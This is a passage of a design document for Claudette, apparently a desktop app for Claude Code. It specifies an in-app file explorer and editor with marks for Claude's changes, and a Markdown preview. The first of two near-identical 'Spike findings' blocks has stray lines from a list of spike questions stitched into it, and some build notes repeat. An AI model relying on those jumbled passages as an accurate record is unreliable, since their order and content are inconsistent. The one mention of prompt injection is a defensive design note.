    - The changes come from open tabs, so closing the last tab that changed a file takes its marks away.
    - In a git repository, the explorer's **⋯** switches the whole Files tab to **Against git HEAD**, as Changed files' switch does. That also shows the changes the user, commands and closed tabs made.
    - A Files tab opened with nothing saved starts as Settings → Git → **New Files tabs show** says: **Claude's changes** (the default) or **Changes against git HEAD**. From then on the tab keeps its own, saved with it; the setting doesn't change open ones.
  - **What's compared.** That "before" is compared with the editor's text, unsaved edits and all, as Changed files compares it with the file on disk now.
    - It's worked out again 300 ms after typing stops, away from the UI thread.
    - A file over 20,000 lines, or with too many changes to compare (the line diff's limit), shows none, and its tab's tip says why.
  - **Gutter bars**, between the line numbers and the text: a green bar beside lines added, a bar in the accent beside lines changed, and a small red notch between two lines where lines were removed.
  - **Peek.** A click on a bar opens the old lines under the change, pushing the lines below it down.
    - Its header names the tab, or tabs, that changed the file and when: *"Changed by Claude in refactor auth · 14:05"*. That links to the tab, at its last change to the file.
    - The header also has **Revert**, the previous and next change, and ×.
    - Under the header are the lines the change replaced, highlighted, in the removed color.
    - **Revert** puts them back in the editor's text as one step, which Undo takes back. The file then has unsaved edits: nothing is written until it's saved.
    - `F3` and `F4`, the conversation's previous and next message ([§14](#keyboard-shortcuts)), go to the previous and next change and open its peek.
  - **Inline and side by side.** For a file with changes, a bar under the tabs switches between **Edit**, **Inline changes** and **Side by side**. In a pane too narrow for the bar's one row, **Whole file**, **Wrap lines** and **Reviewed** go onto a second. A Markdown file's bar always shows, with **Preview** and **Edit and preview** too ([Markdown preview](#markdown-preview)).
    - The last two are §8's diff view inside the tab, read-only, with **Whole file**, **Wrap lines**, the highlighting, and **Revert** on each change.
    - **Revert** there changes the editor's text, as the peek's does.
    - A double-click on a line goes back to **Edit** at that line.
    - Each open file keeps its own choice.
  - **Reviewed.** The bar has **Reviewed**, and so does the file tab's menu.
    - Ticking it ticks the file in every one of the project's open tabs whose Changed files lists it, at its latest change, as ticking it there does ([§8](#8-file-changes--diff-view), "Reviewed"). The rows' reviewed icon follows.
    - It shows as ticked while every one of those tabs has the file ticked.
- **Opening files in the editor.** Settings → Files and diffs → **Open files in**: **Claudette's editor, at the line named** (the default) or **The app the OS uses for the file**, as before.
  - **Where from:**
    - a file named in Claude's replies ([Files named in Claude's replies](#files-named-in-claudes-replies));
    - Changed files' **Open**, and the diff window's, unless **Open in the diff window** sends it elsewhere;
    - **Open** in the details of a Read, Edit, Write or NotebookEdit card, beside **Open diff**;
    - a path in a project run's log ([Project tools](#project-tools), "A run's log"), which opens beside the log as from a conversation.
  - Each of their menus keeps **Open in the OS's app**.
  - **At the line.** A line named in a reply (`Player.cpp:42`, `:42:7`, `#L42-L51`) is gone to, and a range is selected. An Edit card's file opens at the first line its change touched, from its `structuredPatch`.
  - **Which Files tab.** The one of the group whose folder holds the file, the deepest one when a group's folder is inside another's.
    - A file in no group's folder (`~/.claude/settings.json`) opens in the Files tab of the clicked tab's group. Its file tab shows its whole path, and the explorer doesn't list it.
  - **Where it shows.** A click in a conversation opens the Files tab beside it, as **Open beside** does, unless it's on screen already. With Settings → Files and diffs → **Show a file clicked in a conversation** set to **In its place** (the default is **Beside the conversation**), the Files tab takes the conversation's pane instead, as selecting it in the sidebar does. Either way it takes the focus, so the keyboard goes to the editor.
    - Opened beside the conversation for its first file (it had none open), the Files tab starts with its explorer hidden, so the file has the pane. That's this tab alone, and it's kept with the tab; the other Files tabs keep theirs. The explorer's button, **Find file** and **Reveal in the explorer** bring it back, and so do a folder named in a reply and opening the Files tab from its group.
    - Closing the last file there closes the Files tab too, and the conversation has its width back (**File tabs**, above).
  - **What still goes elsewhere:**
    - A program or shortcut that isn't text (`.exe`, `.lnk`, `.app`, `.desktop`) still shows in its folder.
    - Binary files and files over 10 MB open in the OS's app.
    - An image opens in Claudette's image window, as Settings → Files and diffs → **Open images in** says ([Opening images](#opening-images)).
    - A folder in the project shows in the explorer, expanded and selected. One elsewhere opens in Finder, Explorer or the file manager.
  - **Scripts** (`.bat`, `.ps1`, `.sh`, `.py`, `.js`) open in the editor, since showing their text doesn't run them.
  - With **The app the OS uses**, every file goes where it went before.
- **Settings → Files and diffs**, a new category:
  - **The explorer is on the**: **Left** (the default) or **Right**;
  - **Open files in**: **Claudette's editor, at the line named** (the default) or **The app the OS uses for the file**;
  - **Open images in**: **Claudette's image viewer** (the default) or **The app the OS uses for the file** ([Opening images](#opening-images));
  - **Show a file clicked in a conversation**: **Beside the conversation** (the default) or **In its place**;
  - **Open in the diff window**: **Opens the file, as Open files in says** (the default), **Opens the file in the app the OS uses for it**, or **Opens the changes in the diff tool**, which is off until Settings → Files and diffs has a diff tool ([§8](#8-file-changes--diff-view));
  - **Wrap long lines**: off by default;
  - **Indent new lines with**, for files that have no indentation to go by: 4 spaces by default.
- **Keyboard.**
  - **Go to file** (`Ctrl/Cmd+P`) is a new rebindable shortcut.
  - **Not built yet:** **Open project files** in the list without a default. Settings → Keyboard can't list a command with no default yet, so for now it's the group's button, its menu and the command palette.
  - **The window's shortcuts that act on a tab** act on the editor while the Files tab has the focus:
    - **Find in the conversation** opens the editor's find;
    - **Close tab** closes the file showing, and the Files tab itself once none is open (with the last file, beside another tab with the explorer hidden);
    - **Previous message in the conversation** and **Next message in the conversation** go through the changes.
  - **The editor's own keys** are listed under Settings → Keyboard's fixed keys:
    - `Ctrl/Cmd+S` saves, and `Ctrl/Cmd+Alt+S` saves all;
    - `Ctrl+H` replaces (`Cmd+Option+F` on macOS);
    - `Ctrl+G` goes to a line;
    - `Alt+Z` turns word wrap on or off;
    - `Ctrl+PageDown` and `Ctrl+PageUp` (`Cmd+Option+→` and `←`) go to the next and previous file.
- **Accessibility.**
  - The explorer, the file tabs, the chip, the peek's buttons and the banners have names a screen reader can say.
  - The editor's text can't be read by a screen reader yet. AvaloniaEdit has no automation support, and Avalonia has none for text ranges (AvaloniaEdit #541). So every file's menu keeps **Open in the OS's app**, for an editor that can be read.
  - Zoom and reduced motion apply as they do everywhere else ([§3](#accessibility)).
- **Not covered:**
  - completion, errors, going to a definition and other language services;
  - moving files by dragging them in the explorer;
  - splitting the editor;
  - more than one cursor (AvaloniaEdit has only box selection);
  - previews of images;
  - saving by itself;
  - git staging and commits;
  - a terminal.

**Steps.** ✅ All built 2026-10-15, in this order: the spike; the tab in the shell; the explorer and the editor; Claude's changes; opening files in the editor.

**Spike findings** (2026-10-15).

How it was tested:
0. **Spike.** Put AvaloniaEdit 12.0.0 and AvaloniaEdit.TextMate 12.0.0 into Claudette, to find out:
- The editor was drawn with Skia on Avalonia's headless platform, so frames could be saved, looked at and timed.
- The timings come from that harness. It adds about 5 ms a frame, and its numbers varied by up to half between runs, so they're sizes, not promises.

- **It fits.**
  - It builds against Avalonia 12.1.4 with warnings as errors, and TextMateSharp stays at 2.0.4.
  - It adds 670 KB: `AvaloniaEdit.dll` and `AvaloniaEdit.TextMate.dll`.
  - Its theme has to be included in `App.axaml` (`avares://AvaloniaEdit/Themes/Fluent/AvaloniaEdit.xaml`).
   - whether the editor draws in the headless UI tests, so Verify snapshots can cover it;
- **Its colors match the diff view's** character for character, once AvaloniaEdit's own links are off.
  - That held for ten of the repository's files (C#, AXAML, JavaScript, Markdown, YAML, PowerShell, shell, JSON, C++ and Python) in both themes.
  - With the links on, AvaloniaEdit draws every address in a fixed blue in both themes and opens it itself. So the editor turns them off (`EnableHyperlinks`, `EnableEmailHyperlinks`).
   - whether its TextMate colors match `Diffs/SyntaxHighlighter`'s, in both styles and themes;
- **A large file is quick.** The test file was 50,000 lines (2.1 MB) of C#.
  - It opens in about 0.7 seconds with its first screen colored. The rest is tokenized in the background in 5 to 8 seconds.
  - A page down takes 35 to 50 ms a frame, and a keystroke 20 to 35 ms.
  - Typing `/*` at the top recolors the whole file as a comment within about 120 ms.
  - It takes 35 to 70 MB more managed memory, and about 150 MB more working set.
  - Core's `LineDiff` compares the whole file in 17 to 30 ms, so the bars can be worked out again after each pause in typing.
- **Long lines are slow, for two reasons.**
  - **Tokenizing on the UI thread.** AvaloniaEdit.TextMate tokenizes every line on screen again, on the UI thread, each time the view scrolls, sideways included (`TextEditorModel.TokenizeViewPort`). TextMateSharp gives a line up to 3 seconds and its first 10,000 characters. On a minified line of 10 KB or more, each scroll and each keystroke near the line's end froze the editor for 3 to 9 seconds.
  - **Coloring.** Coloring a line in thousands of runs is slow in itself: 300 to 450 ms a keystroke for a minified line of 10 to 100 KB.
  - **Without TextMate**, a keystroke took about 90 ms on a 100 KB line, about 225 ms on 1 MB and about 830 ms on 5 MB.
  - **So the editor doesn't use `InstallTextMate`.**
    - It keeps AvaloniaEdit.TextMate's public coloring transformer (`TextMateColoringTransformer`, with `SetModel`, `SetGrammar` and `SetTheme`), over TextMateSharp's `TMModel`, which tokenizes on its own thread.
    - It feeds that model through Claudette's own view of the document, so nothing tokenizes on the UI thread.
    - It leaves lines over 2,000 characters uncolored.
  - **With both,** a keystroke took 19 ms on a 2 KB line, 37 ms on 10 KB, 185 ms on 100 KB and 410 ms on 1 MB. Hence the 2,000 characters, and opening read-only past 1,000,000 (**Which files open**, above).
- **The peek works.**
  - **How.** An `InlineObjectElement` sits at the end of the line, with `TextBlock.BaselineOffset` set to the text's baseline. That makes its row grow downward by exactly the peek's height: 76 pixels for the header and two old lines. The content is then moved to the text view's left edge, as wide as the view.
  - **The lines under it** move down, and the caret, clicks and selection on them still land on the right line.
  - **A selection** through the peeked line doesn't cover the peek.
  - **Its buttons** take clicks.
   - how it copes with a 50,000-line file, and with a 5 MB file on one line;
  - **It stays** when there's typing on the peeked line, and when it's scrolled away and back.
  - **Three things to build around:**
    - **The caret.** AvaloniaEdit draws the caret as tall as its row: `Caret.CalcCaretRectangle` uses the line's top and bottom, where AvalonEdit used the text's. So on a peeked line the caret ran down the peek: 94 pixels for a 17.5-pixel line. The editor draws its own caret from `VisualYPosition.TextTop` and `TextBottom`, with AvaloniaEdit's made transparent. An upstream fix would make that unnecessary.
    - **The current line's highlight** covers the whole row too, peek and all. The editor draws its own, the text's height.
   - whether room can be opened between two lines for the peek, with an `InlineObjectElement` from a `VisualLineElementGenerator`, since AvaloniaEdit has nothing like Monaco's view zones;
   - what typing Japanese with Windows' IME does, since support for showing the text being composed is still in an open pull request (AvaloniaEdit #592).
- **The selection.** AvaloniaEdit's default is a solid accent, over which some syntax colors are hard to read. The editor sets a see-through one.
- **The UI tests.**
  - The editor lays out under the tests' headless drawing.
  - Typing and `Ctrl+Z` reach it through the window, once its `TextArea` has the focus (not the `TextEditor`).
  - `UiText.Describe` shows nothing of it, since it draws its text itself. So `UiText` will describe a `TextEditor` by its lines, caret and selection. The peek, the chip and the banners are ordinary controls it already reads.
  - The Skia harness's frames, which the headless tests don't draw, were checked by eye.
- **Screen readers.** The editor and its text area have no automation peer (`NoneAutomationPeer`), as expected (**Accessibility**, above).
- **IME.** AvaloniaEdit 12.0.0 tells Avalonia it can't show text being composed (`SupportsPreedit` is false). So an IME composes in its own window at the caret, and the text arrives once it's done.
- **Still to verify:**
  - typing with a real IME: Japanese on Windows, and Korean on macOS, where it's reported broken;
  - the timings on real screens rather than headless;
  - macOS and Linux (so far only Windows).
- **Verified once built:** the editor beside a real conversation in a pane, on Windows, in both styles and themes.

**Spike findings** (2026-10-15).

How it was tested:
- AvaloniaEdit 12.0.0 and AvaloniaEdit.TextMate 12.0.0 ran inside Claudette's own `App`, with its styles, fonts and colors, on Windows.
- The editor was drawn with Skia on Avalonia's headless platform, so frames could be saved, looked at and timed.
- The timings come from that harness. It adds about 5 ms a frame, and its numbers varied by up to half between runs, so they're sizes, not promises.

- **It fits.**
  - It builds against Avalonia 12.1.4 with warnings as errors, and TextMateSharp stays at 2.0.4.
  - It adds 670 KB: `AvaloniaEdit.dll` and `AvaloniaEdit.TextMate.dll`.
  - Its theme has to be included in `App.axaml` (`avares://AvaloniaEdit/Themes/Fluent/AvaloniaEdit.xaml`).
  - Its find and replace panel comes with it, with match case, whole word, regular expressions, replace and replace all. It suits both themes.
- **Its colors match the diff view's** character for character, once AvaloniaEdit's own links are off.
  - That held for ten of the repository's files (C#, AXAML, JavaScript, Markdown, YAML, PowerShell, shell, JSON, C++ and Python) in both themes.
  - With the links on, AvaloniaEdit draws every address in a fixed blue in both themes and opens it itself. So the editor turns them off (`EnableHyperlinks`, `EnableEmailHyperlinks`).
  - Text with no color of its own takes the editor's text color, as in the diff view.
- **A large file is quick.** The test file was 50,000 lines (2.1 MB) of C#.
  - It opens in about 0.7 seconds with its first screen colored. The rest is tokenized in the background in 5 to 8 seconds.
  - A page down takes 35 to 50 ms a frame, and a keystroke 20 to 35 ms.
  - Typing `/*` at the top recolors the whole file as a comment within about 120 ms.
  - It takes 35 to 70 MB more managed memory, and about 150 MB more working set.
  - Core's `LineDiff` compares the whole file in 17 to 30 ms, so the bars can be worked out again after each pause in typing.
- **Long lines are slow, for two reasons.**
  - **Tokenizing on the UI thread.** AvaloniaEdit.TextMate tokenizes every line on screen again, on the UI thread, each time the view scrolls, sideways included (`TextEditorModel.TokenizeViewPort`). TextMateSharp gives a line up to 3 seconds and its first 10,000 characters. On a minified line of 10 KB or more, each scroll and each keystroke near the line's end froze the editor for 3 to 9 seconds.
  - **Coloring.** Coloring a line in thousands of runs is slow in itself: 300 to 450 ms a keystroke for a minified line of 10 to 100 KB.
  - **Without TextMate**, a keystroke took about 90 ms on a 100 KB line, about 225 ms on 1 MB and about 830 ms on 5 MB.
  - **So the editor doesn't use `InstallTextMate`.**
    - It keeps AvaloniaEdit.TextMate's public coloring transformer (`TextMateColoringTransformer`, with `SetModel`, `SetGrammar` and `SetTheme`), over TextMateSharp's `TMModel`, which tokenizes on its own thread.
    - It feeds that model through Claudette's own view of the document, so nothing tokenizes on the UI thread.
    - It leaves lines over 2,000 characters uncolored.
  - **With both,** a keystroke took 19 ms on a 2 KB line, 37 ms on 10 KB, 185 ms on 100 KB and 410 ms on 1 MB. Hence the 2,000 characters, and opening read-only past 1,000,000 (**Which files open**, above).
- **The peek works.**
  - **How.** An `InlineObjectElement` sits at the end of the line, with `TextBlock.BaselineOffset` set to the text's baseline. That makes its row grow downward by exactly the peek's height: 76 pixels for the header and two old lines. The content is then moved to the text view's left edge, as wide as the view.
  - **The lines under it** move down, and the caret, clicks and selection on them still land on the right line.
  - **A selection** through the peeked line doesn't cover the peek.
  - **Its buttons** take clicks.
  - **The old lines** inside it are a second, read-only editor with the same coloring.
  - **It stays** when there's typing on the peeked line, and when it's scrolled away and back.
  - **Three things to build around:**
    - **The caret.** AvaloniaEdit draws the caret as tall as its row: `Caret.CalcCaretRectangle` uses the line's top and bottom, where AvalonEdit used the text's. So on a peeked line the caret ran down the peek: 94 pixels for a 17.5-pixel line. The editor draws its own caret from `VisualYPosition.TextTop` and `TextBottom`, with AvaloniaEdit's made transparent. An upstream fix would make that unnecessary.
    - **The current line's highlight** covers the whole row too, peek and all. The editor draws its own, the text's height.
    - **Its position.** A peek placed by line number stays on that line number when lines are added above. So it's placed by a `TextAnchor`, which moves with the text.
- **The gutter bars** are an `AbstractMargin` drawn from the visible lines, using `LineDiff`'s hunks with no context. They drew added, changed and removed lines in both styles, with changed lines in the accent.
- **The selection.** AvaloniaEdit's default is a solid accent, over which some syntax colors are hard to read. The editor sets a see-through one.
- **The UI tests.**
  - The editor lays out under the tests' headless drawing.
  - Typing and `Ctrl+Z` reach it through the window, once its `TextArea` has the focus (not the `TextEditor`).
  - `UiText.Describe` shows nothing of it, since it draws its text itself. So `UiText` will describe a `TextEditor` by its lines, caret and selection. The peek, the chip and the banners are ordinary controls it already reads.
  - The Skia harness's frames, which the headless tests don't draw, were checked by eye.
- **Screen readers.** The editor and its text area have no automation peer (`NoneAutomationPeer`), as expected (**Accessibility**, above).
- **IME.** AvaloniaEdit 12.0.0 tells Avalonia it can't show text being composed (`SupportsPreedit` is false). So an IME composes in its own window at the caret, and the text arrives once it's done.
- **Still to verify:**
  - typing with a real IME: Japanese on Windows, and Korean on macOS, where it's reported broken;
  - the timings on real screens rather than headless;
  - macOS and Linux (so far only Windows);
  - the editor beside a real conversation in a pane.

**How it's built.**

- **Packages.** `Avalonia.AvaloniaEdit` and `AvaloniaEdit.TextMate` 12.0.0 (MIT), which use the TextMateSharp already referenced. `App.axaml` includes AvaloniaEdit's Fluent theme. Two of AvaloniaEdit's open bugs shape how it's used:
  - The editor keeps `AllowScrollBelowDocument` on, since with it off, dragging a selection to the last line freezes it (#614).
  - It has a least size, since squeezed very small it overflows its stack (#596, #613).
- **Core,** in `ProjectFiles/`:
  - `FolderListing`: a folder's entries (`TreeEntry`), folders first, with what git ignores (`GitWorkingTree.CheckIgnoredAsync`, `git check-ignore` in batches of 200) and links that lead back up.
  - `NewEntry`: a new file's or folder's name checked as it's typed (`NewEntryName`: its path, or why it can't be used), and the file or folder made, never over a file already there.
  - `RenameEntry`: a new name checked as `NewEntry`'s are (a change of case alone, and the disk ignoring case or not), and the rename, never over anything; `DeleteEntry`: a folder's files counted for the question, and deleting for good, read-only files and links too.
  - The trash is `Files/ITrash` (`NoTrash` where there's none, and in tests), whose `Claudette.Platform/Files/` has each: `WindowsTrash` (the shell's `IFileOperation`, with a progress sink that stops a delete the shell would do for good, on a thread of its own), `MacTrash` (`NSFileManager`'s `trashItemAtURL:`) and `GioTrash`.
  - `TextFile`: reading (the encoding, the reason a file opens read-only, or why it doesn't open) and saving with the encoding, byte order mark and line endings. Saving goes through `Revert.Write`, so `AtomicFile` and its check that the file is still what was read.
  - `Indentation` and `LineEndings`: finding and converting them.
  - `DiskChange`: what a change on disk does to an open file. It's pure.
  - `ProjectChanges`: each file's earliest "before" across the project's tabs, and who changed it (`ChangeAuthor`, with its tab and latest tool call).
  - `ChangeMarkers`: the gutter's blocks, from `LineDiff`'s hunks with no context; none past 20,000 lines.
  - `EditorBackups`: unsaved text, in `editor-backups` in the data folder, with a hash of the file it was typed over. Those no open file has used for 30 days go at launch.
  - `ProjectFilesState` and `OpenFileState`, kept in `AppState.ProjectFiles`.
  - Watching goes through `Files/IFolderWatcher`, so tests use a fake. Finding a file uses `ProjectFileIndex` and `PathMatcher`.
  - `ReplyFileReference` reads a column and the end of a range too (`:42:7`, `:42-50`, `#L42C7`, `#L42-L50`).
- **The shell.**
  - `IShellTab` is what `TabViewModel` and `ProjectFilesViewModel` both are: an id, a name, a group folder, being selected and shown, and a pane.
  - `OpenTabs` and the panes take either kind, and the main area and the sidebar's rows have a template for each. `AllTabs` stays sessions only, so nothing that counts, closes, restores or threads sessions changes.
  - `ShellViewModel.Selected` is the focused tab; `SelectedTab` is that tab when it's a session, and `SelectedFiles` when it's a Files tab. `ProjectTab` is the session the project's settings and menu go by: the focused one, or the Files tab's group's first.
  - `TabGroupViewModel.Files` holds the group's Files tab, and a group goes only once it has neither tabs nor that.
  - `ShellViewModel.ProjectFiles.cs` opens, closes and restores Files tabs, and opens files in them from elsewhere. `AppState.GroupOrder` keeps the groups' order apart from the tabs', since a group can have no session tab. `ShellLayout` keeps the explorer's width and whether it's hidden.
- **The app.**
  - `ProjectFilesViewModel`: the tab, with partials for the explorer (`ExplorerRow`, watching the folders shown), new files and folders and renaming (`NameRow`, the row a name is typed in, `NewEntryRow` or `RenameRow`, which the tree's list draws with a template of its own), deleting (`DeleteQuestion`, and the open files following a rename or closing, in every Files tab, through the shell), the open files (closing, asking first with `CloseQuestion`, pinning, saving), finding a file by name (`FoundFile`), and Claude's changes (the letters, **Show only changed files**, **Against git HEAD**, **Reviewed**).
  - `ProjectFileViewModel`: one open file: its text, the chip, saving, the banner, the marks and the peek, the modes and their `DiffWindowViewModel`.
  - `Editor/`: `IEditorDocument`, over AvaloniaEdit's `TextDocument` in the app (`TextEditorDocument`) and over a string in the view model tests, since AvaloniaEdit's document only answers the thread that made it; and `EditorLanguages`, the chip's language.
  - `Views/ProjectFilesView` (the explorer, the file tabs, the question before closing) and `Views/ProjectFileView` (the banner, the modes, the editor or the diff, the chip).
  - `Views/Editor/`:
    - `EditorRenderers`: `CurrentLineHighlight`, the text's height rather than the row's; `PeekCaretLayer`, which on a peeked line hides AvaloniaEdit's caret and draws one the text's height (elsewhere AvaloniaEdit's own shows); and `IndentationFolding`, since AvaloniaEdit only comes with XML's.
    - `ChangeMargin`: the bars.
  - `Views/Editor/`: `ChangeMargin` (the bars), `ChangePeekGenerator` (the peek) and `EditorChip`.
    - `ChangeMargin`: the bars.
    - `ChangePeekGenerator`: the peek, placed by a `TextAnchor`.
    - `IndentationFolding`: folding by indentation, since AvaloniaEdit only comes with XML's.
    - `EditorChip`.
  - `Views/DiffLines`: the diff view's lines, taken out of `DiffWindow` so that the window and the Files tab both show them. In the tab, `DiffSource.RevertInto` reverts into the editor's text rather than the file.
  - `Themes/ProjectFilesStyles.axaml`: the tab's look. The change and editor colors are new tokens in `App.axaml`, with Claude values in `Themes/ClaudeColors.axaml`, light and dark.
  - Settings → Files and diffs is `Settings/EditorPage`.
  - Opening a path from a tab goes through `TabViewModel.OpenPathAsync`, which Changed files reaches through `IChangedFilesHost.OpenPathAsync`.
- **Claude Code:** nothing new. The changes come from the `originalFile` that Changed files already reads, and an Edit card's line from its `structuredPatch`, so `compat/surface.yaml` doesn't change.

**Tests.**

- **In Core**, in `ProjectFiles/`: `FolderListingTests`, `NewEntryTests` (the names refused, on Windows and elsewhere), `RenameEntryTests` (renaming, a change of case, and deleting for good), `TextFileTests` (encodings and byte order marks, line endings, binary, too large, read-only, refusing to write over a change, and writing a deleted file back), `DiskChangeTests`, `ChangeMarkersTests`, `ProjectChangesTests`, `IndentationTests`, `LineEndingsTests`, `EditorBackupsTests` and `ProjectFilesStateTests`; and `FolderWatcherTests`, `GitWorkingTreeTests` (what git ignores) and `ReplyFileReferenceTests` (columns and ranges).
- **In the app**, with `TabTestHarness` and `FakeTimeProvider` (`FakeFolderWatcher` for the OS's notices, and `PlainEditorDocument` for the text):
  - `ProjectFilesTests`: the group's button, the keyboard skipping the tab, the group outliving its last session tab, `Ctrl/Cmd+W`; the explorer and the disk; new files and folders, where they go and the names refused; renaming, with the open files following and a folder staying expanded, and deleting, to the trash, for good where there's none, and when it fails; previews, pins, tab labels, files that aren't text, the chip; saving, **Don't save**, **Save** on the question, and a file changed under a save; Claude's edit with and without unsaved edits, the marks, the peek's link to the tab, a double-click in the diff, **Reviewed** and **Show only changed files**; finding a file by name; and what comes back at launch and after a restart.
  - `ProjectFilesOpeningTests`: a reply's file opening at its line beside the conversation or, with the setting, in its place; what still goes to the OS; a folder in the explorer; the group's button bringing the explorer back; **Go to file**; the tab in panes.
- **`ProjectFilesUiTests`:** the tab rendered with the explorer on each side, in both styles and themes; the chip; the bars and the peek; the banner; the list of files found by name; the new row's box with the keyboard: what it refuses, `Enter`, `Esc` and a click elsewhere; and `F2`'s box, with the name selected up to its extension, and `Delete`'s question, with its button ready.
- **In Platform**, `TrashTests`: `gio trash` faked, and the Recycle Bin and the macOS Trash for real only with `CLAUDETTE_TEST_TRASH=1`, since what they take lands in the user's own trash. A drive with no Recycle Bin (a `subst` drive, a `\\localhost\C$` path) was tried by hand on 2026-10-26: the file stays, and the result says there's no trash.

### Markdown preview

✅ Built 2026-10-24.

A Markdown file in a [Project Files](#project-files) tab shows rendered as well as as text: the README or plan Claude wrote, with its headings, lists, tables, code blocks and images, in the editor's place or beside it, as VS Code's Markdown preview does. Until now it showed only as text, so reading one meant reading its marks.

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│ README.md ● │ Player.cpp │                                                       │
├──────────────────────────────────────────────────────────────────────────────────┤
│ Edit · Preview · Edit and preview   Inline changes · Side by side   ✓ Reviewed   │
│  1  # Starfall                         ┆  Starfall                                │
│  2                                     ┆                                          │
│  3  A space shooter for **two**        ┆  A space shooter for two players.        │
│  4  players.                           ┆                                          │
│  5                                     ┆  Building                                │
│  6  ## Building                        ┆  1. Open Starfall.uproject.              │
│  7  1. Open `Starfall.uproject`.       ┆  2. Build the Development Editor.        │
│                  ╭──────────────────╮  ┆                                          │
│                  │ Ln 3 · Markdown… │  ┆                                          │
└──────────────────────────────────────────────────────────────────────────────────┘
```

- **Which files.** The ones the editor colors as Markdown, by their extension: `.md`, `.markdown`, and the others the Markdown grammar takes (`.mkd`, `.mdown` and the like). The chip says *Markdown* for them ([Project files](#project-files), "The chip").
- **The bar.** A Markdown file's bar under the file tabs always shows, changes or not.
  - Its first part is **Edit**, **Preview** and **Edit and preview**. While the file has Claude's changes, **Inline changes** and **Side by side** follow as a second part, then **Reviewed**, as for any file ([Project files](#project-files), "Claude's changes"). The five are one choice: picking **Preview** leaves **Side by side**, and the other way round.
  - Any other file's bar is as before: one part with **Edit**, **Inline changes** and **Side by side**.
  - **Edit** is the editor. **Preview** is the file rendered, in the editor's place. **Edit and preview** has the editor on the left and the preview on the right.
  - In **Edit and preview**, the line between them drags to give either side more, down to 240 pixels each; a double-click on it shares the width evenly again, as it is each time the mode is picked.
  - Each open file keeps its own choice, kept with its tab and restored at launch, as the diff modes are. A Markdown file opens in **Edit**.
- **The preview.**
  - **What it shows** is the editor's text, unsaved edits and all, rendered as Claude's replies are ([§5](#5-conversation-view)): the same fonts and sizes, headings, lists and task lists, tables, quotes and alerts, and code blocks colored as a reply's, with **Wrap** and **Copy**. Text in it selects and copies as a reply's does.
  - **A paragraph wrapped in the file** reads as one: a line break inside it is a space, as VS Code and GitHub show a file. A reply keeps its line breaks, since Claude's are meant; two spaces or a `\` at a line's end still break it in the preview.
  - **It follows the typing**: 300 ms after a change it shows it, and while typing goes on it catches up every 300 ms.
  - **Front matter** (a `---` block of YAML at the top, as Jekyll's pages have) isn't shown, as in VS Code.
  - HTML in the file isn't shown, and neither are Mermaid diagrams or math, which stay code: Claudette's Markdown doesn't draw them.
  - Inline code that names a file stays code, unlike in a reply ([Files named in Claude's replies](#files-named-in-claudes-replies)): the preview has no session whose files a name could be.
  - **Too large.** A file over 1 MB isn't previewed. The preview says *"This file is over 1 MB, too large to preview."* Rendering takes about two seconds for 700 KB (DESIGN.md), all of it on the UI thread, which can't be made smaller: Avalonia's controls are made and measured there.
  - The first time a file is previewed it's rendered whole; after that only what changed is.
- **Images** load as a reply's do ([Images in Claude's replies](#images-in-claudes-replies)), with a relative path read against the file's own folder, as GitHub reads it: `screenshots/menu.png` in `docs/index.md` is `docs/screenshots/menu.png`.
  - A file in the project's folder loads at once; a web image, or a file outside the project's folder, waits for a click; a network path never loads. A file can be prompt-injected as a reply can: Claude may have written it from a page it read.
  - What's let load and what loaded are remembered in the file's tab while it's open, as in a session's tab. A click opens an image in the image window.
- **Links.**
  - **A heading in the file** (`[Saving](#saving)`) scrolls the preview to it. The heading's name is made as Markdig makes it: lowercase, with dashes for spaces, as GitHub does for plain words.
  - **A web link** (`https`, `http`, `mailto`) opens in the browser, or for an image's address in the image window, as Settings → Files and diffs → **Open images in** says, as a reply's does ([Opening images](#opening-images)).
  - **A file**, read against the file's own folder (`[the spec](specs/weapons.md)`, `#L42` for a line), opens as a file named in a reply does: text in a file tab of the Files tab whose project holds it, at the line; an image in the image window; a folder in the explorer; a program or shortcut in its folder, never run ([Files named in Claude's replies](#files-named-in-claudes-replies)).
  - A link to a file that isn't there says so over the file: *"Couldn't find specs/shots.md."* It goes at the next link clicked, or when the mode changes.
- **Scrolling together.** In **Edit and preview**, scrolling either side scrolls the other to the same place: the line at the top of the editor is the one at the top of the preview. Switching between **Edit** and **Preview** keeps the place too.
  - Each paragraph, heading, list item, table cell and code block in the preview knows the lines it came from. Within one, and between two, the place goes in proportion.
  - A double-click in the preview selects a word, as in a reply, rather than going to the line in the editor as VS Code's does.
- **Keys.**
  - In **Edit and preview**, find (`Ctrl/Cmd+F`), **Go to line** and the editor's keys work in the editor. In **Preview**, `Ctrl/Cmd+F` finds a file by name, as in the diff modes.
  - The command palette has **Preview the file**, **Edit and preview the file** and **Edit the file**, the ones that aren't showing, while a Markdown file shows.
- **Accessibility.** The modes are radio buttons a screen reader names, and the preview's text is the same control a reply's is.
- **Not covered:**
  - finding text in the preview;
  - going from a place in the preview to its line in the editor;
  - the preview in a tab or window of its own;
  - HTML, Mermaid diagrams and math.

**How it's built.**

- **Core.** `FileViewMode` gains `Preview` and `EditAndPreview`, saved with the file's tab. `ReplyImageAddress.Classify` takes the folder a relative path is read against apart from the folder that loads at once, and `ReplyImages` passes it on.
- **The text.** `Editor/MarkdownPreview` is the preview's `IMarkdownUpdateProducer`, as `KeptMarkdown` is a reply's. It parses the editor's text away from the UI thread, with LiveMarkdown's pipeline and Markdig's YAML front matter, and hands the renderer each parse as a change from the one before (where the two texts start and stop differing), so LiveMarkdown builds again only the blocks after it. It keeps the parsed text's line starts, for scrolling together. It parses only while the preview shows.
- **Scrolling together.** `Editor/PreviewScroll` maps a line to a place in the preview and back, from the preview's text blocks: their lines, from LiveMarkdown's `MarkdownTextBlock.SourceSpan`, and their tops and heights. It's pure, so the view model tests cover it.
- **The file.** `ProjectFileViewModel` has `IsMarkdown`, the two modes, the preview, its `ReplyImages`, and the links' `OpenLinkCommand`. `IMarkdownHost` is what Markdown shown in Claudette needs from where it's shown (its images, and Copy on its code blocks), which `TabViewModel` and `ProjectFileViewModel` both are; `Views/ReplyImageView` and `Views/CodeBlockCopy` look for it rather than for a tab. Opening a path, and a web image link, move from `TabViewModel` to the shell (`ShellViewModel.OpenPathAsync`, `OpenWebImageAsync`), so the tab and the preview share them.
